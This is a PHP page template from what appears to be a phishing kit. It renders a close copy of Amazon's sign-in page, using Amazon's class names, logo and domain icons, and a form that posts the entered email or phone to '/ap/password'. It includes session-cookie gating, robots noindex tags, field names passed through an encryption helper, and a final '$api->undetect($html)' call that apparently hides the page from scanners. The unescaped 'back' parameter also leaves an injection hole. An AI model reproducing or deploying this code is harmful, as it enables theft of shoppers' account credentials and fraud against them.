<?php
require __DIR__ . '/../../function.php';
require $api->language();

$api->check_cookie();

$username = isset($_GET['back']) ? $_GET['back'] : null;
$html = '
<!DOCTYPE html>
<html class="a-ws a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-gradients a-transform3d a-touch-scrolling a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember a-ember-modern">
<head>
    <title dir="ltr">'.$api->text_encode($lang['login']['title']).'</title>
    <meta http-equiv="content-type" content="text/html; charset=utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=yes">
    <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noodp, noydir">
    <link rel="shortcut icon" href="'.$api->image_encode("assets/img/favicon.ico")['local'].'">
    <link rel="stylesheet" href="'.$api->text_encode("../../assets/css/login-style.css").'">
    <link rel="stylesheet" href="'.$api->text_encode("../../assets/css/style-login.css").'">
    <link rel="stylesheet" href="'.$api->text_encode("../../assets/css/style-cvf.css").'">
</head>
<body class="auth-no-skin ap-locale-en_US a-m-us a-aui_72554-c a-aui_a11y_2_750578-t2 a-aui_a11y_6_837773-t2 a-aui_a11y_sr_678508-t1 a-aui_amzn_img_959719-c a-aui_amzn_img_gate_959718-c a-aui_killswitch_csa_logger_372963-c a-aui_pci_risk_banner_210084-c a-aui_template_weblab_cache_333406-c a-aui_tnr_v2_180836-c a-meter-animate">
    <div class="a-section a-padding-medium auth-workflow">
        <div class="a-section a-spacing-none auth-navbar">
            <div class="a-section a-spacing-medium a-text-center">
                <a class="a-link-nav-icon" href="#!">
                    <i class="a-icon a-icon-logo" role="img"></i>
                    ';
                    if ($_SESSION['countrycode'] == "jp") {
                        $html .= '<i class="a-icon a-icon-domain-'.strtolower($_SESSION['countrycode']).' a-icon-domain-'.strtolower($_SESSION['countrycode']).'" role="img"></i>';
                    } else {
                        $html .= '<i class="a-icon a-icon-domain-'.strtolower($_SESSION['countrycode']).' a-icon-domain" role="img"></i>';
                    }
                    $html .= '
                </a> 
            </div>
        </div>
        <div id="authportal-center-section" class="a-section">
            <div id="authportal-main-section" class="a-section">
                <div class="a-section a-spacing-base auth-pagelet-container">
                    <div class="a-section">
                    ';
                    if (isset($_GET['error']) && $_GET['error'] == true) {
                    $html .= '
                        <div aria-live="assertive" id="auth-error-message-box" class="a-box a-alert a-alert-error auth-server-side-message-box a-spacing-base" role="alert">
                            <div class="a-box-inner a-alert-container">
                                <h4 class="a-alert-heading">'.$api->text_encode($lang['login']['titlealertsignin']).'</h4>
                                <i class="a-icon a-icon-alert"></i>
                                <div class="a-alert-content">
                                    <ul class="a-unordered-list a-nostyle a-vertical a-spacing-none">
                                        <li>
                                            <span class="a-list-item">
                                                '.$api->text_encode($lang['login']['alertsignin']).'
                                            </span>
                                        </li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                        ';
                    }
                    $html .= '
                    </div>
                </div>
                <div class="a-section auth-pagelet-container">
                    <div class="a-section a-spacing-base">
                        <div class="a-section">
                            <form method="POST" action="/ap/password">
                            <div class="a-section">
                                <div class="a-box">
                                    <div class="a-box-inner a-padding-extra-large">
                                        <h1 class="a-spacing-small">
                                            '.$api->text_encode($lang['login']['signin']).'
                                        </h1>
                                        <div class="a-row a-spacing-base">
                                            <label for="username" class="a-form-label">
                                                '.$api->text_encode($lang['login']['emailorphone']).'
                                            </label>
                                            <input type="text" id="username" name="'.$api->encypt("username").'" value="'.$username.'" class="a-input-text a-span12 auth-autofocus auth-required-field auth-require-claim-validation" required="true">
                                            <div id="inputErrorMsgUser"></div>
                                        </div>
                                        <div class="a-section">
                                            <button type="submit" id="btn_next" class="a-button a-button-span12 a-button-primary">
                                                <span class="a-button-inner">
                                                    <span id="continue-announce" class="a-button-text">
                                                        '.$api->text_encode($lang['login']['continue']).'
                                                    </span>
                                                </span>
                                            </button>
                                            <div id="legalTextRow" class="a-row a-spacing-top-medium a-size-small">
                                                '.$api->text_encode($lang['login']['continuing']).'
                                                <a href="#gp">'.$api->text_encode($lang['login']['conditions']).'</a> and 
                                                <a href="#gp">'.$api->text_encode($lang['login']['privacy']).'</a>.
                                            </div> 
                                        </div>
                                        <div class="a-section">
                                            <div class="a-row a-expander-container a-expander-inline-container">
                                                <a data-csa-c-func-deps="aui-da-a-expander-toggle" data-csa-c-type="widget" data-csa-interaction-events="click" aria-expanded="false" role="button" href="javascript:void(0)" data-action="a-expander-toggle" class="a-expander-header a-declarative a-expander-inline-header a-link-expander" data-a-expander-toggle="{&quot;allowLinkDefault&quot;:true, &quot;expand_prompt&quot;:&quot;&quot;, &quot;collapse_prompt&quot;:&quot;&quot;}" data-csa-c-id="n69pz8-mvcaml-xzztl-tg3xu5">
                                                    <i class="a-icon a-icon-expand"></i>
                                                    <span class="a-expander-prompt">
                                                        '.$api->text_encode($lang['login']['needhelp']).'
                                                    </span>
                                                </a>
                                                <ul class="a-unordered-list a-nostyle a-vertical">
                                                    <li>
                                                        <span class="a-list-item">
                                                            <div data-expanded="false" class="a-expander-content a-expander-inline-content a-expander-inner" style="display:none">
                                                                <a id="auth-fpp-link-bottom" class="a-link-normal" href="#gp">
                                                                    '.$api->text_encode($lang['login']['forgot']).'
                                                                </a>
                                                            </div>
                                                        </span>
                                                    </li>
                                                    <li>
                                                        <span class="a-list-item">
                                                            <div data-expanded="false" class="a-expander-content a-expander-inline-content a-expander-inner" style="display:none">
                                                                <a id="ap-other-signin-issues-link" class="a-link-normal" href="#gp">
                                                                    '.$api->text_encode($lang['login']['other']).'
                                                                </a>
                                                            </div>
                                                        </span>
                                                    </li>
                                                </ul>
                                            </div>
                                        </div>
                                        <div id="ab-signin-link-section" class="a-section">
                                            <hr aria-hidden="true" class="a-divider-normal">
                                            <div class="a-section a-spacing-micro">
                                                <span class="a-text-bold">
                                                    '.$api->text_encode($lang['login']['buyer']).'
                                                </span>
                                            </div>
                                            <a id="ab-signin-ingress-link" class="a-link-normal" href="#gp">
                                                <span>
                                                    '.$api->text_encode($lang['login']['shop']).'
                                                </span>
                                            </a>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            </form>
                        </div>
                        <div class="a-divider a-divider-break">
                            <h5 aria-level="5">'.$api->text_encode($lang['login']['new']).'</h5>
                        </div>
                        <span id="auth-create-account-link" class="a-button a-button-span12 a-button-base">
                            <span class="a-button-inner">
                                <a id="createAccountSubmit" href="#gp">
                                    '.$api->text_encode($lang['login']['create']).'
                                </a>
                            </span>
                        </span>
                    </div>
                </div>
            </div>
        </div>
        <div id="right-2"></div>
        <div class="a-section a-spacing-top-extra-large auth-footer">
            <div class="a-divider a-divider-section">
                <div class="a-divider-inner"></div>
            </div>
            <div class="a-section a-spacing-small a-text-center a-size-mini">
                <span class="auth-footer-seperator"></span>
                <ul>
                    <li style="list-style-type: none; margin: 0; padding:0; display: inline-block;">
                        <a class="a-link-normal a-nowrap" rel="noopener" href="#gp">
                            '.$api->text_encode($lang['login']['conditions']).'
                        </a>
                        <span class="auth-footer-seperator"></span>
                    </li>
                    <li style="list-style-type: none; margin: 0; padding:0; display: inline-block;">
                        <a class="a-link-normal a-nowrap" rel="noopener" href="#gp">
                            '.$api->text_encode($lang['login']['privacy']).'
                        </a>
                        <span class="auth-footer-seperator"></span>
                    </li>
                    <li style="list-style-type: none; margin: 0; padding:0; display: inline-block;">
                        <a class="a-link-normal a-nowrap" rel="noopener" href="#gp">
                            '.$api->text_encode($lang['login']['help']).'
                        </a>
                        <span class="auth-footer-seperator"></span>
                    </li>
                </ul>
            </div>
            <div class="a-section a-spacing-none a-text-center"> 
                <span class="a-size-mini a-color-secondary">
                    '.$api->text_encode($lang['login']['copyright']).'
                </span>
            </div>
        </div>
    </div>
    <script src="'.$api->text_encode("../../assets/js/jquery.min.js").'"></script>
    <script src="'.$api->text_encode("../../assets/js/jquery.mask.min.js").'"></script>
    <script src="'.$api->text_encode("../../assets/js/jquery.validate.min.js").'"></script>
    <script>
        var usernameEmpty = '.json_encode($lang['login']['usernameEmpty']).';
        var usernameInvalid = '.json_encode($lang['login']['usernameInvalid']).';
    </script>
    <script src="'.$api->text_encode("../../assets/js/signin.auth.js").'"></script>
</body>
</html>';

$api->undetect($html);
?>